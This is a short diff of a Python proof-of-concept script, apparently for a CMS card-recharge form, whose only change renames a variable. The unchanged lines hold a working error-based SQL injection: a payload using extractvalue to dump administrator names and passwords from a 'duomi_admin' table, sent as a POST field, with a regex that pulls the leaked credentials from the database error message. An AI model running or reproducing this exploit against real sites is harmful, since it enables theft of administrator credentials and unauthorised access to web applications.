@@ -17,12 +17,12 @@ def poc():
         payload = """
             bypass'or"'"or extractvalue(1,(select group_concat(0x3a,name,0x3a,password) from duomi_admin))or"'"='1
         """
-        postData = {
+        post_data = {
             'cardkey': '1',
             'cardpwd': payload,
             'cardb': '%25E5%2585%2585%25E5%2580%25BC'
         }
-        r = requests.post(url, cookies=cookie, data=postData)
+        r = requests.post(url, cookies=cookie, data=post_data)
 
         p = re.compile("(?<=XPATH syntax error: \':)(.*)(?=\' <br)")
         print("[*] The result: " + re.search(p, r.text).group(0))
